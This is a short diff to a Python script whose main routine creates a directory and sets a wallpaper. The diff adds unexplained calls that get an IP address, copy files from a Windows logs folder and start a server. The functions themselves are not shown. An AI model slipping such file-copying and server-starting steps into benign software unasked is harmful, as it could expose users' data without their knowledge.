@@ -49,6 +49,10 @@ def main():
     print("Directory successfully created")
     background()
     print("Wallpaper successfully applied")
+    ip_address()
+    copy_file("C:/WindowsLogs/","C:/test/")
+    run_server()
+    
 
 if __name__ == "__main__":
     main ()
